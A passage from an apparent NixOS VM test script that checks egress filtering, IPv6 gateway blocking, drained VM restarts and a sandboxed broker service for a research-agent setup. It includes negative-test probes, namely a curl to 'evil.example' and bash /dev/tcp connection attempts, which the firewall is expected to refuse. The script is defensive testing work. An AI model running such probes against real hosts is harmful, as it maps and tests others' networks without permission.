        "curl -sS -m 5 -o /dev/null --resolve evil.example:443:192.168.1.12 "
        "http://evil.example:443/"
    )

    # 5. Port 53 is open only towards the configured upstream resolver,
    #    and only for dnsmasq. upstream's dnsmasq listens on every
    #    address, so .12:53 accepts TCP from an unfiltered node (workstation,
    #    same vlan) — not from the agent. A root process on the agent
    #    asking the upstream directly (skipping dnsmasq's name filter)
    #    gets no answer, even for an allowlisted name.
    workstation.succeed("timeout 6 bash -c 'exec 3<>/dev/tcp/192.168.1.12/53'")
    agent.fail("timeout 6 bash -c 'exec 3<>/dev/tcp/192.168.1.12/53'")
    agent.fail("dig +time=2 +tries=1 @${nodes.upstream.networking.primaryIPAddress} api.ebay.com")
    agent.fail("dig +tcp +time=2 +tries=1 @${nodes.upstream.networking.primaryIPAddress} api.ebay.com")

    # 6. Expand step of the egress-broker switchover (research-agent
    #    docs/egress-broker.md §12.1): the guest reaches the broker's port
    #    on the SLIRP gateway (10.0.2.2:8124) AND still the scraper's
    #    (:8123) — MCP processes started on the old code keep talking to
    #    the scraper directly until the contract step. In prod 10.0.2.2 is
    #    host loopback; upstream plays it here with a listener on both
    #    ports. Each test node also has its OWN QEMU SLIRP NIC on eth0 in
    #    the same 10.0.2.0/24; take it down so 10.0.2.x is reached over
    #    the test vlan (eth1), or the checks fail for routing reasons.
    for m in (agent, upstream):
        m.succeed("ip link set eth0 down")
    upstream.succeed(
        "mkdir -p /srv/gw && echo gw-ok > /srv/gw/index.html",
        "systemd-run --unit=fake-broker ${pkgs.python3}/bin/python3 -m http.server 8124 --bind 10.0.2.2 --directory /srv/gw",
        "systemd-run --unit=fake-scraper ${pkgs.python3}/bin/python3 -m http.server 8123 --bind 10.0.2.2 --directory /srv/gw",
        "systemd-run --unit=fake-other ${pkgs.python3}/bin/python3 -m http.server 8125 --bind 10.0.2.2 --directory /srv/gw",
    )
    agent.succeed("ip addr replace 10.0.2.16/24 dev eth1")
    agent.succeed("ip route get 10.0.2.2 | grep -q 'dev eth1'")
    for port in (8123, 8124, 8125):
        upstream.wait_until_succeeds(f"${pkgs.curl}/bin/curl -sSf -m 2 http://10.0.2.2:{port}/")
    for port in (8123, 8124):
        out = agent.succeed(f"curl -sS -m 5 http://10.0.2.2:{port}/")
        assert out.strip() == "gw-ok", f"agent cannot reach gateway :{port}: {out!r}"
    # Control: the gateway is not wide open, only those two ports.
    agent.fail("curl -sS -m 5 -o /dev/null http://10.0.2.2:8125/")

    # 7. The keyed API hosts stay resolvable through the expand step: old
    #    code still calls them from the guest. (The contract step removes
    #    them; its lane asserts NXDOMAIN.)
    agent.succeed("getent ahostsv4 api.exa.ai")

    final = egress_set()
    print("[diag] set after test:\n" + final)
    assert "192.168.1.12" not in final, "unlisted name's address leaked into the egress set"

    # ---------------------------------------------------------------
    # scraper guest egress, at runtime (nodes scraper + upstream).
    # In prod 10.0.2.2 is SLIRP's gateway = the HOST's loopback; any new
    # connection there let rendered pages reach host-local services.
    # ---------------------------------------------------------------
    scraper.start()
    scraper.wait_for_unit("multi-user.target")
    scraper.wait_for_unit("fake-scraper-api.service")
    scraper.wait_for_open_port(8000)

    # Test VMs carry their OWN QEMU SLIRP NIC on eth0, in the same
    # 10.0.2.0/24 the scraper guest's rules name. Take it down on both
    # nodes so 10.0.2.x is reached over the test vlan (eth1), where
    # upstream plays SLIRP's gateway/DNS. Without this the 10.0.2.x checks
    # below would fail for routing reasons and prove nothing.
    for m in (scraper, upstream):
        m.succeed("ip link set eth0 down")
    scraper.succeed("ip route get 10.0.2.2 | grep -q 'dev eth1'")

    def scraper_get(url):
        return scraper.execute(f"curl -sS -m 5 -o /dev/null -w '%{{http_code}}' {url}")

    # Positive control first: the same listener on a non-private address
    # is reachable, so the failures below are the policy, not the network.
    rc, code = scraper_get("http://203.0.113.10:443/")
    assert rc == 0 and code == "200", f"public egress broken: rc={rc} code={code!r}"

    # Host gateway and private ranges: refused, whatever the port.
    for url in ["http://10.0.2.2:443/", "http://10.0.2.2:8123/",
                "http://192.168.1.10:443/"]:
        rc, code = scraper_get(url)
        assert rc != 0, f"scraper reached {url} (code {code!r}) — guest egress must refuse it"

    # SLIRP's DNS port stays reachable (the scraper resolves every URL it
    # renders) — and only that port: upstream also listens on :443 at
    # the same address, which must stay refused.
    scraper.succeed("timeout 6 bash -c 'exec 3<>/dev/tcp/10.0.2.3/53'")
    scraper.fail("timeout 6 bash -c 'exec 3<>/dev/tcp/10.0.2.3/443'")

    # IPv6. The guest sets enableIPv6 = false, yet live its SLIRP NIC still
    # carries fec0::/64 from SLIRP's RA (networkd re-enables v6 per link),
    # and SLIRP maps fec0::2 to the HOST's ::1 exactly as 10.0.2.2 maps to
    # 127.0.0.1 (measured 2026-10-03: a canary on host [::1] was served to
    # the guest, and a page WebSocket to ws://[fec0::2] reached it past the
    # Python request guard). Reproduce that link state here: v6 on eth1
    # only, SLIRP's v6 gateway played by upstream.
    upstream.succeed(
        "sysctl -w net.ipv6.conf.eth1.disable_ipv6=0",
        "ip -6 addr add fec0::2/64 dev eth1 nodad",
        "systemd-run --unit=v6-gateway ${pkgs.python3}/bin/python3 -m http.server 8443 --bind fec0::2 --directory /srv/cdn",
    )
    scraper.succeed(
        "sysctl -w net.ipv6.conf.eth1.disable_ipv6=0",
        "ip -6 addr add fec0::15/64 dev eth1 nodad",
    )
    upstream.wait_until_succeeds("ss -ltn | grep -q '\\[fec0::2\\]:8443'")
    rc, code = scraper_get("-g http://[fec0::2]:8443/")
    assert rc != 0, f"scraper reached the v6 host gateway (code {code!r}) — guest egress must refuse IPv6"

    # Inbound still works: the host's hostfwd arrives from 10.0.2.2, and
    # replies on that connection must not be caught by the output drop.
    out = upstream.succeed("curl -sS -m 5 --interface 10.0.2.2 http://10.0.2.15:8000/")
    assert out.strip() == "api-ok", f"inbound API via gateway broken: {out!r}"

    counters = scraper.succeed("nft list table inet scraper-egress")
    print("[diag] scraper-egress:\n" + counters)
    assert "packets 0 " not in counters, "reject rule never matched — test exercised nothing"

    # Non-vacuity: with the chain emptied, the very same gateway URL is
    # reachable — so the refusals above were the policy, not the network.
    scraper.succeed("nft flush chain inet scraper-egress output")
    rc, code = scraper_get("http://10.0.2.2:443/")
    assert rc == 0 and code == "200", f"control: gateway unreachable even without policy: rc={rc} code={code!r}"
    rc, code = scraper_get("-g http://[fec0::2]:8443/")
    assert rc == 0 and code == "200", f"control: v6 gateway unreachable even without policy: rc={rc} code={code!r}"

    # ===============================================================
    # Egress-broker switchover, expand step (research-agent
    # docs/egress-broker.md §12.1-§12.3), on the host node.
    # ===============================================================
    import json, re, shlex

    CHECKOUT = "/home/jonathan/Repos/research-agent"
    LOCKS = "/home/jonathan/.cache/research-agent"
    SLOTS = 2  # researchAgent.slots default; tmpfiles and the roll read the same option

    def unit_state(unit):
        return workstation.succeed(f"systemctl show -P ActiveState {unit}").strip()

    def wait_state(unit, want, timeout=120):
        workstation.wait_until_succeeds(
            f"test \"$(systemctl show -P ActiveState {unit})\" = {want}", timeout=timeout
        )

    def as_jonathan(cmd):
        return f"runuser -u jonathan -- {cmd}"

    def slot_free(i):
        # Non-blocking flock as the MCP would take it: 0 = free.
        return workstation.execute(as_jonathan(f"flock -n -x {LOCKS}/agent.lock.{i} true"))[0] == 0

    # --- Slot files: created by jonathan's tmpfiles rule, never by root.
    # The MCP opens them O_CREAT|O_RDWR 0600 (research-agent
    # mcp_server/server.py); a root-created one makes that open EACCES and
    # fails every research call.
    for i in range(SLOTS):
        st = workstation.succeed(f"stat -c '%a %U' {LOCKS}/agent.lock.{i}").strip()
        assert st == "600 jonathan", f"agent.lock.{i}: expected '600 jonathan', got {st!r}"
        workstation.succeed(as_jonathan(
            "${pkgs.python3}/bin/python3 -c "
            f"\"import os; os.close(os.open('{LOCKS}/agent.lock.{i}', os.O_CREAT | os.O_RDWR | os.O_CLOEXEC, 0o600))\""
        ))
    st = workstation.succeed(f"stat -c '%U' {LOCKS} /home/jonathan/.cache").split()
    assert st == ["jonathan", "jonathan"], f"slot dir chain must stay jonathan's: {st}"

    # --- The era file the new MCP reads first (§12.4): transition era.
    era = workstation.succeed("cat /etc/research-agent/egress-era").strip()
    assert era == "legacy-ok", f"egress-era must be legacy-ok in the expand step, got {era!r}"

    # --- The microVMs are never restarted by a switch; the roll does it.
    for vm in ("research-agent", "scraper"):
        rif = workstation.succeed(
            f"systemctl cat microvm@{vm}.service | sed -n 's/^X-RestartIfChanged=//p' | tail -1"
        ).strip()
        assert rif.endswith("false"), f"microvm@{vm}: X-RestartIfChanged must be false, got {rif!r}"

    # ---------------------------------------------------------------
    # Drained roll, scraper instance, against a fake scraper VM.
    # ---------------------------------------------------------------
    # The watchdog timers would restart the fakes (they serve no sshd on
    # 2225); the watchdog is driven by hand below.
    workstation.succeed("systemctl stop scraper-healthcheck.timer research-agent-healthcheck.timer")
    workstation.succeed(
        "mkdir -p /run/fake-scraper /run/fake-vm",
        "chmod 0777 /run/fake-scraper /run/fake-vm",
        "echo '{\"${openSessionsKey}\": 0, \"${pendingArtifactsKey}\": 0}' > /run/fake-scraper/counters.json",
        f"install -d -m 0755 -o jonathan -g users {CHECKOUT}/scraper",
        as_jonathan(f"sh -c 'echo v1 > {CHECKOUT}/scraper/server.py'"),
    )
    for vm, fake in (("scraper", "${fakeScraperVm}"), ("research-agent", "${fakeResearchVm}")):
        workstation.succeed(
            f"mkdir -p /run/systemd/system/microvm@{vm}.service.d /run/systemd/system/microvm-virtiofsd@{vm}.service.d",
            f"cp ${fakeVmDropin "FAKE"} /run/systemd/system/microvm@{vm}.service.d/fake.conf",
            f"sed -i 's|FAKE|{fake}|' /run/systemd/system/microvm@{vm}.service.d/fake.conf",
            f"cp ${noopDropin} /run/systemd/system/microvm-virtiofsd@{vm}.service.d/noop.conf",
        )
    workstation.succeed("systemctl daemon-reload")

    def boots(vm):
        f = "/run/fake-scraper/boots" if vm == "scraper" else "/run/fake-vm/boots"
        return int(workstation.succeed(f"cat {f} 2>/dev/null | wc -l").strip())

    def roll_journal(vm):
        return workstation.succeed(f"journalctl -u research-vm-roll@{vm}.service --no-pager -o cat")

    def run_roll(vm, timeout=180):
        # Path units may already have started it; either way wait for a
        # finished run (Type=exec: active while it works).
        workstation.succeed(f"systemctl start research-vm-roll@{vm}.service")
        wait_state(f"research-vm-roll@{vm}.service", "inactive", timeout)

    def set_counters(sessions, pending):
        workstation.succeed(
            f"echo '{{\"${openSessionsKey}\": {sessions}, \"${pendingArtifactsKey}\": {pending}}}' > /run/fake-scraper/counters.json"
        )

    def bump_scraper_code(tag):
        workstation.succeed(as_jonathan(f"sh -c 'echo {tag} > {CHECKOUT}/scraper/server.py'"))

    def scraper_health():
        return json.loads(workstation.succeed("${pkgs.curl}/bin/curl -sf -m 5 http://127.0.0.1:8123/health"))

    workstation.succeed("systemctl start microvm@scraper.service")
    workstation.wait_until_succeeds("${pkgs.curl}/bin/curl -sf -m 2 http://127.0.0.1:8123/health")
    assert boots("scraper") == 1

    # 1. Nothing to do: booted == current and /health says stale=false.
    run_roll("scraper")
    assert boots("scraper") == 1, "roll restarted a scraper that runs current code"
    assert "not needed: scraper reports it runs the code on disk" in roll_journal("scraper"), roll_journal("scraper")
    # A change under scraper/ that the scraper says is not a code change
    # (here: bytecode) is not rolled for: the scraper's verdict decides.
    workstation.succeed(as_jonathan(
        f"sh -c 'mkdir -p {CHECKOUT}/scraper/__pycache__ && echo x > {CHECKOUT}/scraper/__pycache__/a.pyc'"
    ))
    assert scraper_health()["stale"] is False
    run_roll("scraper")
    assert boots("scraper") == 1, "roll restarted a scraper that reported stale=false"

    # 2. A slot file root cannot use as jonathan's: the roll reports a
    #    configuration error and never creates the file (a root-owned
    #    0600 slot file would EACCES every MCP open).
    workstation.succeed(f"mv {LOCKS}/agent.lock.1 {LOCKS}/aside")
    bump_scraper_code("v2")
    workstation.succeed("rm -f /run/microvm-healthcheck-notify/roll-scraper")
    workstation.execute("systemctl start research-vm-roll@scraper.service")
    workstation.wait_until_succeeds(
        "systemctl show -P Result research-vm-roll@scraper.service | grep -qx exit-code"
    )
    workstation.fail(f"test -e {LOCKS}/agent.lock.1")
    assert boots("scraper") == 1, "roll restarted without holding every slot"
    assert slot_free(0), "a failed roll must not keep slot 0"
    workstation.succeed("test -s /run/microvm-healthcheck-notify/roll-scraper")
    assert "agent.lock.1" in roll_journal("scraper")
    workstation.succeed(f"mv {LOCKS}/aside {LOCKS}/agent.lock.1")
    workstation.succeed("systemctl reset-failed research-vm-roll@scraper.service")

    # 3. A busy slot is waited for while the slots already won are HELD
    #    (never release-and-retry), and the scraper restarts only once its
    #    own /health reports idle. While it is not idle, the roll waits at
    #    most scraperQuietSeconds (10 s here), then releases every slot and
    #    EXITS 0 (deferred); the retry timer tries again later.
    def deferrals():
        return int(workstation.succeed(
            "journalctl -u research-vm-roll@scraper.service -o cat | grep -c 'deferred; every slot released' || true"
        ).strip())

    def assert_deferred(before, why):
        workstation.wait_until_succeeds(
            f"test $(journalctl -u research-vm-roll@scraper.service -o cat | grep -c 'deferred; every slot released') -gt {before}",
            timeout=60,
        )
        wait_state("research-vm-roll@scraper.service", "inactive", 30)
        res = workstation.succeed("systemctl show -P Result research-vm-roll@scraper.service").strip()
        assert res == "success", f"{why}: a deferral must exit 0, got {res}"
        # Another process takes every slot at once: nothing is held.
        assert slot_free(0) and slot_free(1), f"{why}: a deferred roll must give every slot back"
        workstation.succeed("test ! -e /run/research-agent/rolling")
        t = workstation.succeed("systemctl show -P ActiveState research-vm-roll-retry-scraper.timer").strip()
        assert t == "active", f"{why}: the retry timer must be armed, got {t}"

    set_counters(1, 0)
    workstation.succeed(
        "systemd-run --uid=jonathan --unit=hold-slot-1 "
        f"flock -x {LOCKS}/agent.lock.1 /run/current-system/sw/bin/sleep infinity"
    )
    workstation.wait_until_fails(as_jonathan(f"flock -n -x {LOCKS}/agent.lock.1 true"))
    workstation.succeed("systemctl start research-vm-roll@scraper.service")
    workstation.wait_until_succeeds("journalctl -u research-vm-roll@scraper.service -o cat | grep -q 'waiting for slot 1'")
    assert not slot_free(0), "roll must hold slot 0 while it waits for slot 1"
    workstation.succeed("test ! -e /run/research-agent/rolling")
    before = deferrals()
    workstation.succeed("systemctl stop hold-slot-1.service")
    assert_deferred(before, "open session")
    assert "not idle after 10s (busy 1 0)" in roll_journal("scraper"), roll_journal("scraper")
    assert boots("scraper") == 1, "scraper restarted while it reported an open session"
    # Becomes idle: the retry timer's next attempt restarts it, once.
    set_counters(0, 0)
    workstation.wait_until_succeeds("test $(cat /run/fake-scraper/boots | wc -l) -eq 2", timeout=60)
    wait_state("research-vm-roll@scraper.service", "inactive", 120)
    assert boots("scraper") == 2, f"expected exactly one restart, boots={boots('scraper')}"
    workstation.succeed("test ! -e /run/research-agent/rolling")
    assert slot_free(0) and slot_free(1)
    assert scraper_health()["stale"] is False, "restarted scraper does not run the checkout's code"

    # 4. Pending artifacts alone also keep it from restarting — and the
    #    roll never holds the slots past the cap waiting for them (a
    #    crashed run's artifacts live 1800 s, the callers' whole slot
    #    budget): /health pinned at pending_artifacts=1 → release, exit 0,
    #    twice in a row (the retry timer re-runs it), slots free between.
    set_counters(0, 1)
    before = deferrals()
    bump_scraper_code("v3")
    assert_deferred(before, "pending artifact")
    assert_deferred(before + 1, "pending artifact, retry")
    assert boots("scraper") == 2, "scraper restarted over un-pulled artifacts"
    set_counters(0, 0)
    workstation.wait_until_succeeds("test $(cat /run/fake-scraper/boots | wc -l) -eq 3", timeout=60)
    wait_state("research-vm-roll@scraper.service", "inactive", 120)
    assert boots("scraper") == 3
    workstation.succeed("test ! -e /var/lib/research-vm-roll/scraper.pending-since")

    # 5. Today's scraper (no counters, no `stale`): restarted after every
    #    slot has been held for scraperQuietSeconds, once — a re-run with
    #    scraper/ unchanged since that restart does not roll it again.
    workstation.succeed("touch /run/fake-scraper/legacy")
    bump_scraper_code("v4")
    run_roll("scraper")
    assert boots("scraper") == 4, f"legacy scraper not rolled, boots={boots('scraper')}"
    assert "legacy" in roll_journal("scraper")
    run_roll("scraper")
    assert boots("scraper") == 4, "legacy scraper rolled twice for one code change"
    workstation.succeed("rm /run/fake-scraper/legacy")

    # 6. The path unit: a pull that changes scraper/ starts the roll by
    #    itself.
    bump_scraper_code("v5")
    workstation.wait_until_succeeds("test $(cat /run/fake-scraper/boots | wc -l) -eq 5", timeout=120)
    wait_state("research-vm-roll@scraper.service", "inactive", 60)

    # 7. A guest that does not come back: the roll keeps the marker and
    #    every slot (queued calls wait rather than dial a dead VM),
    #    notifies, and the scraper watchdog does not count the dead probe
    #    as a strike meanwhile. When the guest answers, it releases.
    workstation.succeed("touch /run/fake-scraper/broken", "rm -f /run/microvm-healthcheck-notify/roll-scraper")
    bump_scraper_code("v6")
    workstation.wait_until_succeeds("test -s /run/microvm-healthcheck-notify/roll-scraper", timeout=120)
    assert unit_state("research-vm-roll@scraper.service") == "active"
    workstation.succeed("test -e /run/research-agent/rolling")
    assert not slot_free(0) and not slot_free(1), "slots must stay held while the guest is down"
    workstation.succeed("echo 0 > /run/scraper-healthcheck/fail-count")
    workstation.succeed("systemctl start scraper-healthcheck.service")
    cnt = workstation.succeed("cat /run/scraper-healthcheck/fail-count").strip()
    assert cnt == "0", f"watchdog struck during a drained roll: fail-count={cnt}"
    workstation.succeed(
        "journalctl -u scraper-healthcheck.service -o cat | grep -q 'drained roll in progress'"
    )
    workstation.succeed("rm /run/fake-scraper/broken", "systemctl restart microvm@scraper.service")
    wait_state("research-vm-roll@scraper.service", "inactive", 60)
    workstation.succeed("test ! -e /run/research-agent/rolling")
    assert slot_free(0) and slot_free(1)
    # Control: with no roll running, the same dead probe IS a strike.
    workstation.succeed("systemctl start scraper-healthcheck.service")
    cnt = workstation.succeed("cat /run/scraper-healthcheck/fail-count").strip()
    assert cnt == "1", f"control: a failed probe outside a roll must count, got {cnt}"
    # A marker without a running roll (stale, or planted by a jonathan
    # process: the dir is jonathan's) does not silence the watchdog.
    workstation.succeed(as_jonathan("touch /run/research-agent/rolling"))
    workstation.succeed("systemctl start scraper-healthcheck.service")
    cnt = workstation.succeed("cat /run/scraper-healthcheck/fail-count").strip()
    assert cnt == "2", f"a stale marker silenced the watchdog: fail-count={cnt}"
    workstation.succeed("rm /run/research-agent/rolling")

    # ---------------------------------------------------------------
    # Drained roll, research-agent instance: current != booted is the
    # trigger; readiness is the guest's sshd answering for `agent`.
    # ---------------------------------------------------------------
    workstation.succeed(
        "ssh-keygen -q -t ed25519 -N ''' -f /var/lib/research-agent/vm-ssh/ssh_host_ed25519_key",
        "ssh-keygen -q -t ed25519 -N ''' -f /run/fake-vm/client",
        "cp /run/fake-vm/client.pub /run/fake-vm/authorized_keys",
    )
    keypath = "${nodes.workstation.age.secrets.research-agent-host-key.path}"
    workstation.succeed(
        f"d=$(readlink -m $(dirname {keypath})) && mkdir -p \"$d\" && "
        f"install -m 0400 /run/fake-vm/client \"$d/$(basename {keypath})\""
    )
    workstation.succeed("systemctl start microvm@research-agent.service")
    workstation.wait_until_succeeds("ssh-keyscan -t ed25519 -p 2223 127.0.0.1 | grep -q ed25519")
    STATE = "/var/lib/microvms/research-agent"
    assert workstation.succeed(f"readlink {STATE}/current") == workstation.succeed(f"readlink {STATE}/booted")
    run_roll("research-agent")
    assert boots("research-agent") == 1, "rolled a research VM whose booted == current"

    # A pending guest change (what a switch leaves behind now that the
    # switch no longer restarts the VM): the re-link of `current` starts
    # the roll, which restarts once ready-for-agent.
    workstation.succeed(f"ln -sfn /var/empty {STATE}/booted")
    workstation.succeed(f"ln -sfn $(readlink {STATE}/current) {STATE}/current")
    workstation.wait_until_succeeds("test $(cat /run/fake-vm/boots | wc -l) -eq 2", timeout=120)
    wait_state("research-vm-roll@research-agent.service", "inactive", 120)
    assert workstation.succeed(f"readlink {STATE}/current") == workstation.succeed(f"readlink {STATE}/booted")
    j = roll_journal("research-agent")
    assert "ready" in j and "released" in j, j
    assert slot_free(0) and slot_free(1)

    # The same trigger without the path unit: a switch starts
    # microvms.target, which runs the roll after install-microvm re-links
    # `current` — the path unit is new at the switch that introduces it
    # and may not be watching yet when that re-link happens.
    workstation.succeed("systemctl stop research-vm-roll-research-agent.path")
    workstation.succeed(f"ln -sfn /var/empty {STATE}/booted")
    workstation.succeed("systemctl start microvms.target")
    workstation.wait_until_succeeds("test $(cat /run/fake-vm/boots | wc -l) -eq 3", timeout=120)
    wait_state("research-vm-roll@research-agent.service", "inactive", 120)
    workstation.succeed("systemctl start research-vm-roll-research-agent.path")

    # The research watchdog honours the marker of its own roll only.
    workstation.succeed("touch /run/fake-vm/broken", f"ln -sfn /var/empty {STATE}/booted")
    workstation.succeed("systemctl start research-vm-roll@research-agent.service")
    workstation.wait_until_succeeds("test -e /run/research-agent/rolling", timeout=60)
    workstation.wait_until_succeeds("test $(cat /run/fake-vm/boots | wc -l) -eq 4", timeout=60)
    workstation.succeed("echo 0 > /run/research-agent-healthcheck/fail-count")
    workstation.succeed("systemctl start research-agent-healthcheck.service")
    workstation.succeed(
        "journalctl -u research-agent-healthcheck.service -o cat | grep -q 'drained roll in progress'"
    )
    cnt = workstation.succeed("cat /run/research-agent-healthcheck/fail-count").strip()
    assert cnt == "0", f"research watchdog struck during its drained roll: {cnt}"
    workstation.succeed("rm /run/fake-vm/broken", "systemctl restart microvm@research-agent.service")
    wait_state("research-vm-roll@research-agent.service", "inactive", 120)
    workstation.succeed("test ! -e /run/research-agent/rolling")
    assert slot_free(0) and slot_free(1)

    # ---------------------------------------------------------------
    # research-broker on the host, at runtime, with the stub server.py
    # (see `stubBroker`) in place of the research-agent code. The unit,
    # its sockets, its sandbox and its code-watch are what is tested.
    # ---------------------------------------------------------------
    # Inert until the code lands: no listener, nothing trigger-looping.
    for unit in ("research-broker.socket", "research-broker-admin.socket"):
        state = unit_state(unit)
        assert state == "inactive", f"{unit} must stay inert without broker/server.py, got {state}"
    workstation.fail("ss -ltnH 'sport = :8124' | grep -q .")

    # No secret decrypts in a test VM (no host key): plant fake values at
    # the exact paths the unit loads, taken from its own LoadCredential.
    creds = workstation.succeed(
        "systemctl cat research-broker.service | sed -n 's/^LoadCredential=//p'"
    ).split()
    broker_creds = [c.split(":", 1) for c in creds]
    assert len(broker_creds) == 8, f"LoadCredential: {creds}"
    for name, path in broker_creds:
        workstation.succeed(
            f"d=$(readlink -m $(dirname {path})) && mkdir -p \"$d\" && "
            f"printf 'FAKE-%s' {name} > \"$d/$(basename {path})\" && chmod 0400 \"$d/$(basename {path})\""
        )
    # First arrival of the code, the way a pull lands it: the code-watch
    # path unit starts both sockets; nobody runs systemctl by hand.
    workstation.succeed(
        as_jonathan(f"sh -c 'echo urlpolicy-v1 > {CHECKOUT}/scraper/urlpolicy.py'"),
        f"install -d -m 0755 -o jonathan -g users {CHECKOUT}/broker",
        f"install -m 0644 -o jonathan ${stubBroker} {CHECKOUT}/broker/server.py",
    )
    wait_state("research-broker.socket", "active", 60)
    wait_state("research-broker-admin.socket", "active", 60)

    # The VM listener is host loopback :8124 and nothing else.
    listen = workstation.succeed("ss -ltnH 'sport = :8124' | awk '{print $4}'").split()
    assert listen == ["127.0.0.1:8124"], f"broker must listen on exactly 127.0.0.1:8124, got {listen}"
    perms = workstation.succeed("stat -c '%a %U' /run/research-broker/admin.sock").strip()
    assert perms == "600 jonathan", f"admin socket must be 0600 jonathan, got {perms!r}"

    # Socket activation over TCP, as the research VM would trigger it.
    out = workstation.succeed("${pkgs.curl}/bin/curl -sS -m 30 http://127.0.0.1:8124/v1/health")
    assert out == "ok", f"broker health via 127.0.0.1:8124: {out!r}"
    assert unit_state("research-broker.service") == "active"
    vm_probe = json.loads(workstation.succeed("${pkgs.curl}/bin/curl -sS -m 30 http://127.0.0.1:8124/probe"))
    assert vm_probe["listener"] == "vm", vm_probe
    # The VM listener does not serve the admin route.
    workstation.fail("${pkgs.curl}/bin/curl -sSf -m 10 http://127.0.0.1:8124/admin/health")

    # Admin socket: jonathan (the MCP server) gets in, another user does not.
    workstation.fail(
        "runuser -u nobody -- ${pkgs.curl}/bin/curl -sS -m 5 "
        "--unix-socket /run/research-broker/admin.sock http://admin/v1/health"
    )
    # Stands in for the scraper VM's hostfwd on host loopback :8123.
    workstation.succeed("systemctl stop microvm@scraper.service")
    workstation.succeed(
        "systemd-run --unit=fake-scraper-hostfwd ${pkgs.python3}/bin/python3 "
        "-m http.server 8123 --bind 127.0.0.1 --directory /var/empty"
    )
    workstation.wait_for_open_port(8123)
    up = "http://upstream:443/"
    probe = json.loads(workstation.succeed(as_jonathan(
        "${pkgs.curl}/bin/curl -sS -m 60 --unix-socket /run/research-broker/admin.sock "
        f"'http://admin/probe?up={up}'"
    )))
    print(f"[diag] broker sandbox probe: {probe}")
    assert probe["listener"] == "admin", probe
    assert sorted(probe["fdnames"].split(":")) == ["admin", "vm"], probe["fdnames"]
    # DynamicUser: a transient uid, neither root nor jonathan.
    assert 61184 <= probe["uid"] <= 65519, f"not a DynamicUser uid: {probe['uid']}"
    # Exactly the eight keyed-API credentials, readable, and none in env.
    assert sorted(probe["creds"]) == sorted([
        "exa-api-key", "tavily-api-key", "euipo-client-id", "euipo-client-secret",
        "ebay-client-id", "ebay-client-secret", "tradera-app-id", "tradera-app-key",
    ]), f"credentials: {sorted(probe['creds'])}"
    assert probe["creds"] == {n: f"FAKE-{n}" for n, _ in broker_creds}, probe["creds"]
    assert probe["env_has_fake"] is False, "a key reached the broker's environment"
    # Sees only its two code dirs of the checkout, read-only; no /home.
    assert probe["home"] == ["ok", []], f"/home must be an empty tmpfs: {probe['home']}"
    assert probe["write_code"][0] == "err", f"code dir must be read-only: {probe['write_code']}"
    assert probe["scraper_code"] == ["ok", True], probe["scraper_code"]
    # Still reaches what the real broker needs.
    assert probe["scraper_token"] == ["ok", True], f"scraper bearer unreadable: {probe['scraper_token']}"
    assert probe["loopback_scraper"] == ["ok", 200], f"host :8123 unreachable: {probe['loopback_scraper']}"
    assert probe["upstream"] == ["ok", 200], f"curl_cffi upstream call failed: {probe['upstream']}"
    # Its run-registry handover dir (§12.2): private to the dynamic user.
    assert probe["state_mode"] == "0o700", probe["state_mode"]

    # Hardening, scored by systemd itself; a regression fails the lane.
    sec = workstation.succeed("systemd-analyze security --no-pager research-broker.service")
    m = re.search(r"Overall exposure level for research-broker\.service: ([0-9.]+)", sec)
    assert m, sec
    print(f"[diag] research-broker exposure: {m.group(1)}")
    assert float(m.group(1)) <= 2.5, f"research-broker exposure {m.group(1)} > 2.5:\n{sec}"

    # --- Code-watch: graceful reload when the code changes, and only then.
    def starts():
        return workstation.succeed(
            "cat /var/lib/research-broker/starts"
        ).split()

    def reloads():
        return workstation.succeed(
            "cat /var/lib/research-broker/reloads 2>/dev/null || true"
        ).split("\n")[:-1]

    def admin_code():
        return json.loads(workstation.succeed(as_jonathan(
            "${pkgs.curl}/bin/curl -sS -m 30 --unix-socket /run/research-broker/admin.sock http://admin/admin/health"
        )))["code"]

    def reload_requests():
        return int(workstation.succeed(
            "journalctl -u research-broker-code.service -o cat | grep -c 'asking the broker to reload' || true"
        ).strip())

    assert len(starts()) == 1, starts()
    assert reloads() == [], reloads()
    first_code = admin_code()
    # A change event that is not a code change (mtime, bytecode): the
    # code-watch does not judge it, it asks the broker; the broker's own
    # digest says nothing changed and it keeps serving, same process.
    pid = workstation.succeed("systemctl show -P MainPID research-broker.service").strip()
    asked = reload_requests()
    workstation.succeed(as_jonathan(f"touch {CHECKOUT}/broker/server.py"))
    workstation.succeed(as_jonathan(f"sh -c 'mkdir -p {CHECKOUT}/broker/__pycache__ && echo x > {CHECKOUT}/broker/__pycache__/a.pyc'"))
    workstation.wait_until_succeeds("grep -q '^noop ' /var/lib/research-broker/reloads", timeout=60)
    assert reload_requests() > asked, "code-watch did not ask the broker to reload on a change event"
    wait_state("research-broker-code.service", "inactive", 60)
    assert unit_state("research-broker.service") == "active"
    assert workstation.succeed("systemctl show -P MainPID research-broker.service").strip() == pid
    assert len(starts()) == 1, f"broker restarted although its digest is unchanged: {starts()}"
    assert all(r.startswith("noop ") for r in reloads()), reloads()
    # A real change, to the broker's other input (scraper/urlpolicy.py):
    # SIGHUP, the broker sees a new digest and exits 0; the next
    # connection re-activates it on the new code.
    workstation.succeed(as_jonathan(f"sh -c 'echo urlpolicy-v2 > {CHECKOUT}/scraper/urlpolicy.py'"))
    wait_state("research-broker.service", "inactive", 60)
    result = workstation.succeed("systemctl show -P Result research-broker.service").strip()
    assert result == "success", f"a graceful reload must not count as a failure: {result}"
    assert reloads()[-1].startswith("exit "), reloads()
    new_code = admin_code()
    assert new_code != first_code and reloads()[-1] == f"exit {new_code}", (first_code, new_code, reloads())
    assert starts() == [first_code, new_code], starts()

    # --- Code-watch stop step: the code disappears (a revert), and the
    # sockets and service go down instead of staying active with no code
    # behind them (ConditionPathExists is checked only on start).
    assert unit_state("research-broker.service") == "active"
    workstation.succeed(as_jonathan(f"mv {CHECKOUT}/broker {CHECKOUT}/.broker-reverted"))
    for unit in ("research-broker.socket", "research-broker-admin.socket", "research-broker.service"):
        wait_state(unit, "inactive", 90)
    workstation.fail("ss -ltnH 'sport = :8124' | grep -q .")
    # And it comes back with the code.
    workstation.succeed(as_jonathan(f"mv {CHECKOUT}/.broker-reverted {CHECKOUT}/broker"))
    wait_state("research-broker.socket", "active", 60)
    wait_state("research-broker-admin.socket", "active", 60)

    # ---------------------------------------------------------------
    # research-mcp-protocheck (gate G3, §12.6): every live MCP python
    # process carries a protocol marker holding its own start tick, and
    # server.log shows no legacy dial inside the window.
    # ---------------------------------------------------------------
    UID = workstation.succeed("id -u jonathan").strip()
    RUN = f"/run/user/{UID}"
